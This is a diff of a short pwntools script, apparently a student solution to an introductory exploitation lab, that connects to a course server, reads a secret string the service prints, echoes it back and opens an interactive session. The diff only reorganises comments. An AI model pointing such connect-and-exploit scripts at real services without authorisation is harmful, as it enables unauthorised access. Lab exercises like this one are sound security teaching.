@@ -1,23 +1,18 @@
 from pwn import *
 
+''' Establish Connection to Server '''
 # Create Process Object
-# p = process("./lab1-1.bin")
-p = remote("csc748.hostbin.org", 7011)
+# p = process("./1-1_lab.bin")              # Uncomment to Test Script Locally
+p = remote("csc748.hostbin.org", 7011)      # Test Script Against Server
 
-# Read until the Second Newline Char
-p.readuntil(b"\n\n")
+''' Obtain Secret String '''
+p.readuntil(b"\n\n")        # Read until the Second Newline Char
+s = p.read(15)              # Read 15 bytes of Secret String
+print(f"string is: {s}")    # Print Secret String
 
-# Read 15 bytes of Secret String
-s = p.read(15)
-
-# Print Secret String 
-print(f"string is: {s}")
-
-# Send Secret String to process
-p.sendline(s)
-
-# Start an interactive session
-p.interactive()
+''' Exploit Vulnerability '''
+p.sendline(s)               # Send Secret String to process
+p.interactive()             # Start an interactive session
 
 
 
